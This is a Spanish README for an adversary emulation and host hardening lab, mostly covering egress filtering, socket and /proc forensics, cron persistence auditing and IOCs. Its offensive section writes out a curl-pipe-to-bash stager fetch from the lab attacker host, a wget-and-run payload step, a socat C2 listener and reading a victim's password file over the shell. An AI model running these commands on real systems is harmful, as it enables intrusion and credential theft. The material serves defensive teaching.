# Adversary Emulation: Egress C2 & Host Hardening Lab

Laboratorio educativo de **emulación de adversario** y **hardening de host**:
se emula la entrega y ejecución de un backdoor con reverse shell en una red
virtual aislada y, sobre el mismo escenario, se demuestra por qué el firewall
de salida debió haber bloqueado el puerto 4444 y cómo se audita el proceso en
caliente en Linux.

> Ámbito ético: todo ocurre entre dos máquinas virtuales (Kali y Ubuntu) en
> una red interna sin contacto con sistemas reales. Las IPs son privadas del
> laboratorio, el correo de la exposición es ficticio y el payload no contiene
> datos personales. El objetivo es defensivo: entender la técnica para
> detectarla y prevenirla.

## Topología del laboratorio

- **VM1 — Kali Linux (atacante)**: `192.168.199.130`
- **VM2 — Ubuntu Desktop (víctima)**: `192.168.199.131`
- Adaptador 1: NAT (internet). Adaptador 2: red interna (`intnet`).

## La técnica emulada: reverse shell

- **Bind shell (tradicional):** el malware abre un puerto en la víctima y el
  atacante se conecta. El firewall de entrada lo bloquea con facilidad.
- **Reverse shell (C2 de salida):** el puerto se abre en el atacante; es la
  víctima quien inicia la conexión de salida. Para el firewall del host,
  parece tráfico saliente legítimo como cualquier navegación web.

La diferencia de fondo es **dirección del flujo**: el atacante convierte una
conexión saliente (permitida por defecto en casi todos los hosts) en su canal
de comando y control. Por eso la defensa correcta no está en el firewall de
entrada, sino en el control de salida.

## Por qué el firewall de salida debió bloquear el puerto 4444

Ubuntu trae `ufw` con política saliente **permitida por defecto**: cualquier
proceso puede iniciar una conexión a cualquier puerto externo. Con esa
política, la reverse shell hacia `192.168.199.130:4444` se establece sin
ninguna resistencia.

El control que faltó es **egress filtering**: denegar salidas por defecto y
permitir solo lo estrictamente necesario.

```bash
# Política por defecto: denegar todo el tráfico saliente
sudo ufw default deny outgoing

# Permitir solo lo necesario para operar
sudo ufw allow out 80/tcp
sudo ufw allow out 443/tcp
sudo ufw allow out 53/udp

sudo ufw enable
```

Equivalente con iptables:

```bash
sudo iptables -P OUTPUT DROP
sudo iptables -A OUTPUT -o lo -j ACCEPT
sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A OUTPUT -p tcp --dport 80  -j ACCEPT
sudo iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
sudo iptables -A OUTPUT -p udp --dport 53  -j ACCEPT
```

Detalles que evitan romper el host y cierran vectores:

- `-o lo -j ACCEPT` es obligatorio con iptables (ufw ya permite loopback
  por defecto): sin él, los servicios locales dejan de funcionar.
- Restringir el DNS al resolver interno
  (`sudo ufw allow out 53/udp to <DNS>`): si el 53 queda abierto a cualquier
  destino, un malware puede exfiltrar por tunneling DNS, y la regla de
  egress pierde su efecto.
- `deny outgoing` rompe `apt`/updates: permitir explícitamente los mirrors
  (80/443) o un proxy interno.

Con esta política, el `connect()` del payload hacia el puerto 4444 es
rechazado **antes de que se transfiera ningún byte**: no hay shell, no hay
C2 y no hay persistencia útil.

Para el laboratorio, la validación es inmediata: repetir el ataque con la
política de salida por defecto (falla de demostración: la conexión se
establece) y con egress filtering (el listener del atacante nunca recibe
nada).

## Auditoría en caliente: el proceso y su socket en Linux

El segundo control que el laboratorio demuestra es la detección en vivo
durante el incidente, sin herramientas comerciales:

```bash
# 1. Conexiones TCP establecidas con su proceso asociado
ss -tp state established

# 2. Todo lo que toque el puerto del C2 (4444)
ss -tnp | grep ':4444'

# Alternativa clásica
netstat -antp
```

El patrón de entrega "pipe to shell" (`curl | bash`) también deja huella
en el árbol de procesos mientras ocurre:

```bash
ps -ef --forest | grep -E 'curl|bash'
```

La salida de `ss -tp` muestra la tupla completa (`Local Address:Port` →
`Peer Address:Port`) y el PID del proceso. En la VM víctima, durante el
ataque se ve una conexión `ESTAB` desde una IP de la red interna hacia
`192.168.199.130:4444` con el proceso Python asociado.

Con el PID en mano, se audita el proceso en la memoria de Linux a través de
`/proc`:

```bash
# Qué ejecutable es realmente (el enlace simbólico no miente)
ls -l /proc/<PID>/exe

# Argumentos exactos con los que se lanzó
cat /proc/<PID>/cmdline | tr '\0' ' '

# Desde qué directorio corre
ls -l /proc/<PID>/cwd

# Descriptores abiertos: el socket del C2 aparece aquí
ls -l /proc/<PID>/fd | grep socket

# Mapa de memoria del proceso (módulos y regiones mapeadas)
cat /proc/<PID>/maps

# Alternativa: lsof por proceso y por puerto
lsof -p <PID> -i
```

Esto convierte un "proceso Python desconocido" en evidencia forense: binario,
ruta, argumentos, socket activo y mapa de memoria.

## Auditoría de persistencia

El payload del laboratorio intenta inyectarse en `crontab`. En un host real,
la búsqueda de persistencia es:

```bash
crontab -l
sudo ls -la /var/spool/cron/crontabs/
sudo grep -R "SysUpdate" /etc/cron* /var/spool/cron 2>/dev/null
```

Con `auditd` se puede registrar quién modifica los cron de cada usuario:

```bash
sudo auditctl -w /var/spool/cron/crontabs -p wa -k cron_modification
sudo ausearch -k cron_modification
```

Además, cada ejecución del payload queda en los logs de cron:

```bash
grep CRON /var/log/syslog | grep SysUpdate
```

## Fase ofensiva (emulación, solo dentro del lab)

**1. Empaquetar el payload** (Kali):

```bash
pip install pyinstaller staticx patchelf
pyinstaller --onefile BackdoorLinux.py
staticx dist/BackdoorLinux SysUpdate_Static
```

> `--noconsole` es una opción de Windows/macOS: en Linux no aplica (el
> binario ya corre en segundo plano sin abrir terminal).

**2. Entrega simulada** (Kali): servidor HTTP + correo ficticio de
"actualización crítica" que enlaza a la intranet falsa. `index.html`
(servida en `http://192.168.199.130/`) reproduce el aviso; no contiene datos
reales. La página muestra un comando corto y creíble (`curl ... | bash`)
que apunta al stager `patch.sh`; este descarga y lanza el payload
`SysUpdate_Static` en segundo plano (entrega en dos etapas).

```bash
sudo python3 -m http.server 80
```

**3. Listener del C2** (Kali):

```bash
socat TCP-L:4444 -
```

**4. Ejecución** (Ubuntu, usuario limitado): copiar el comando del aviso
falso:

```bash
curl -s http://192.168.199.130/patch.sh | bash
```

El stager descarga el payload a `~/Descargas/SysUpdate_Static`, lo ejecuta
con `nohup` (el terminal de la víctima regresa de inmediato) y muestra
mensajes falsos de éxito. Alternativa manual, sin stager:

```bash
wget http://192.168.199.130/SysUpdate_Static -O ~/Descargas/SysUpdate_Static
chmod +x ~/Descargas/SysUpdate_Static
~/Descargas/SysUpdate_Static
```

La ruta `~/Descargas/SysUpdate_Static` es la que el payload inyecta en el
`crontab` (persistencia): el stager debe dejar el binario ahí o esa fase
falla en silencio.

Kali recibe el shell; la verificación de impacto es mínima e intencional:

```bash
whoami
cat /etc/hostname
# Demostración de exfiltración (el payload dejó los archivos en 644):
cat /home/victima/Documents/contraseñas_servicio_tecnico.txt
```

Contramedida de la fase de exfiltración: permisos estrictos en archivos
sensibles (`chmod 600`, directorios `700`). El `chmod 644` del payload solo
funciona porque esos documentos no estaban protegidos.

## Mapeo MITRE ATT&CK

| Técnica | ID | Evidencia en el laboratorio |
| --- | --- | --- |
| Command and Scripting Interpreter: Python | T1059.006 | Payload en Python (`BackdoorLinux.py`). |
| Non-Standard Port | T1571 | Canal C2 en TCP/4444. |
| Application Layer Protocol: Web Protocols | T1071.001 | Entrega del binario vía HTTP. |
| Ingress Tool Transfer | T1105 | El stager (`patch.sh`) descarga el payload (`SysUpdate_Static`). |
| Scheduled Task/Job: Cron | T1053.003 | Persistencia vía `crontab` del usuario. |
| User Execution: Malicious Link | T1204.001 | Phishing simulado (`index.html`). |
| Exfiltration Over C2 Channel | T1041 | Lectura de los archivos demo a través del shell remoto. |

Controles demostrados del lado defensivo: egress filtering (política de
salida por defecto denegada), auditoría de sockets en vivo (`ss -tp`),
inspección forense del proceso (`/proc/<PID>/...`), auditoría de persistencia
y principio de menor privilegio (el usuario comprometido no tiene root).

## Indicadores de compromiso (IOCs) del laboratorio

| IOC | Valor | Cómo detectarlo |
| --- | --- | --- |
| Conexión C2 | `192.168.199.130:4444` | `ss -tnp \| grep ':4444'` |
| Binario | `SysUpdate_Static` en `~/Descargas` | `ls -l /proc/<PID>/exe` |
| Persistencia | `* * * * * /home/victima/Descargas/SysUpdate_Static` | `crontab -l`, `/var/spool/cron/crontabs/` |
| Artefactos | `contraseñas_servicio_tecnico.txt`, `bonificaciones_empleados_q3_final.csv` | listado de `~/Documents` |
| Logs | ejecuciones cada minuto en cron | `grep CRON /var/log/syslog` |

## Defensas resumidas (Blue Team)

- **Egress Filtering:** denegar salidas por defecto; solo 80/443 y el DNS
  del resolver interno (nunca 53 hacia cualquier destino: es un vector de
  tunneling). Bloquea el canal C2 antes de que nazca.
- **Auditoría en caliente:** `ss -tp` y `netstat -antp` para conexiones
  `ESTABLISHED` hacia IPs externas no esperadas, y mapeo del socket al PID.
- **Inspección del proceso en memoria:** `/proc/<PID>/exe`, `cmdline`, `cwd`,
  `fd` y `maps` para convertir un proceso sospechoso en evidencia.
- **Hardening:** si el host no necesita Python como función principal,
  desinstalarlo elimina de raíz esta familia de payloads; misma lógica para
  cualquier intérprete prescindible.
- **Permisos de archivos:** documentos sensibles en `600` (directorios `700`)
  y auditoría de cambios de permisos (`auditctl -w` sobre rutas críticas).
- **Principio de menor privilegio:** un usuario sin root limita el daño, la
  persistencia instalable y los archivos legibles.
- **EDR / NGAV conductual:** detección por comportamiento (proceso que abre
  socket saliente + conexión persistente) más que por extensión de archivo.

## Archivos del repositorio

| Archivo | Función |
| --- | --- |
| `BackdoorLinux.py` | Payload PoC (persistencia + reverse shell), confinado al laboratorio. |
| `patch.sh` | Stager servido por HTTP: descarga el payload y lo lanza en segundo plano. |
| `index.html` | Página de phishing simulada (intranet falsa), servida en `/`. |
| `style.css` | Estilos de `index.html`. |
| `.gitignore` | Excluye artefactos de build (`dist/`, binarios, `__pycache__`). |

## Límites del laboratorio

El payload no tiene ofuscación contra EDR reales, no intenta escalar
privilegios y la persistencia solo toca el `crontab` del usuario de la VM.
Toda la actividad está confinada a la red interna del laboratorio; nada de
esto está pensado para ejecutarse contra sistemas ajenos.
